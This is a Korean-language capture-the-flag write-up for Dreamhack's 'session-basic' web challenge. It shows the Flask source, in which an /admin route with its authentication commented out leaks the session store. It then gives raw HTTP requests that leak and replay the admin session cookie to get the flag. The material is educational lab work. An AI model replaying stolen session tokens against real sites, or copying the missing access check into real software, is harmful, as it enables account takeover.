# session-basic - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name: Dreamhack
- Category: web
- Difficulty (subjective): easy
- Points: 1
- Provided Files: app.py
- tools: Burp Suite
## Brief Description
쿠키와 세션으로 인증 상태를 관리하는 간단한 로그인 서비스입니다.  
admin 계정으로 로그인에 성공하면 플래그를 획득할 수 있습니다.  

플래그 형식은 DH{...} 입니다.
## Initial Analysis
### Environment
- framework: 
    - flask
- URL End-Point:
    - /login
    - /admin
- Session: O / Cookie: O
### Code
``` python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for

app = Flask(__name__)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

users = {
    'guest': 'guest',
    'user': 'user1234',
    'admin': FLAG
}


# this is our session storage
session_storage = {
}


@app.route('/')
def index():
    session_id = request.cookies.get('sessionid', None)
    try:
        # get username from session_storage
        username = session_storage[session_id]
    except KeyError:
        return render_template('index.html')

    return render_template('index.html', text=f'Hello {username}, {"flag is " + FLAG if username == "admin" else "you are not admin"}')


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    elif request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        try:
            # you cannot know admin's pw
            pw = users[username]
        except:
            return '<script>alert("not found user");history.go(-1);</script>'
        if pw == password:
            resp = make_response(redirect(url_for('index')) )
            session_id = os.urandom(32).hex()
            session_storage[session_id] = username
            resp.set_cookie('sessionid', session_id)
            return resp
        return '<script>alert("wrong password");history.go(-1);</script>'


@app.route('/admin')
def admin():
    # developer's note: review below commented code and uncomment it (TODO)

    #session_id = request.cookies.get('sessionid', None)
    #username = session_storage[session_id]
    #if username != 'admin':
    #    return render_template('index.html')

    return session_storage


if __name__ == '__main__':
    import os
    # create admin sessionid and save it to our storage
    # and also you cannot reveal admin's sesseionid by brute forcing!!! haha
    session_storage[os.urandom(32).hex()] = 'admin'
    print(session_storage)
    app.run(host='0.0.0.0', port=8000)
```
## Vulnerability
### 사용자 판단
``` python
@app.route('/')
def index():
    session_id = request.cookies.get('sessionid', None)
    try:
        # get username from session_storage
        username = session_storage[session_id]
    except KeyError:
        return render_template('index.html')

    return render_template('index.html', text=f'Hello {username}, {"flag is " + FLAG if username == "admin" else "you are not admin"}')
```
`root` 엔드포인트를 보면, 쿠키(`session_id`)를 이용해 사용자를 판단한다. `admin`의 `session_id`를 알아낼 수 있다면, `admin`으로 로그인할 필요 없이 FLAG를 획득할 수 있다.  
### 주석 - Session leak
``` python
@app.route('/admin')
def admin():
    # developer's note: review below commented code and uncomment it (TODO)

    #session_id = request.cookies.get('sessionid', None)
    #username = session_storage[session_id]
    #if username != 'admin':
    #    return render_template('index.html')

    return session_storage
```
인증 코드가 주석처리 되어 있으며 `session_storage`를 반환한다. `/admin` 엔드포인트에 접근만 해도 `session_storage`의 데이터를 획득할 수 있다.  
## Exploit
### Strategy
`/admin` 엔드포인트에 접근하여 `session_starge` 정보를 획득하고, `admin`의 `session_id`로 쿠기를 조작하면 `admin`으로 판단되어 FLAG를 획득할 수 있다.  
### Exploitation Steps
``` http
GET /admin HTTP/1.1
Host: host1.dreamhack.games:24168
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://host1.dreamhack.games:24168/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ko-KR;q=0.8,ko;q=0.7
Cookie: sessionid=e4d58c90fce946644216d0519ef9896f86d9dde84c38b7acfff460664160cd75
Connection: keep-alive
```
``` http
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.11.1
Date: Thu, 04 Sep 2025 02:07:58 GMT
Content-Type: application/json
Content-Length: 152
Connection: close

{"a5597821f352aa8046dd4d30ebeb0b5309c086aa1fdb52f8284db980d69be487":"admin","e4d58c90fce946644216d0519ef9896f86d9dde84c38b7acfff460664160cd75":"guest"}
```
`admin`의 `session_id`를 알아냈다.
### Poc(Poof of Concept)
``` http
GET / HTTP/1.1
Host: host1.dreamhack.games:24168
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://host1.dreamhack.games:24168/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ko-KR;q=0.8,ko;q=0.7
Cookie: sessionid=a5597821f352aa8046dd4d30ebeb0b5309c086aa1fdb52f8284db980d69be487
Connection: keep-alive
```
``` html
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.11.1
Date: Thu, 04 Sep 2025 02:08:50 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1350
Connection: close

<!doctype html>
<html>
  <head>
    <link rel="stylesheet" href="/static/css/bootstrap.min.css">
    <link rel="stylesheet" href="/static/css/bootstrap-theme.min.css">
    <link rel="stylesheet" href="/static/css/non-responsive.css">
    <title>Index Session</title>
    
  
  <style type="text/css">
    .important { color: #336699; }
  </style>

  </head>
<body>

    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Session</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="#">About</a></li>
          </ul>

          <ul class="nav navbar-nav navbar-right">
            <li><a href="/login">Login</a></li>
          </ul>

        </div><!--/.nav-collapse -->
      </div>
    </nav>
    <!-- 
      # default account: guest/guest
    -->
    <div class="container">
      
  <p class="important">
  	Welcome !
  </p>
  
  <h3>
  	Hello admin, flag is DH{find_your_self:)}

  </h3>
  

    </div> <!-- /container -->

    <!-- Bootstrap core JavaScript -->
    <script src="/static/js/jquery.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script> 
</body>
</html>
```
`admin`의 `session_id`로 바꿔치기한 결과 FLAG를 획득했다.  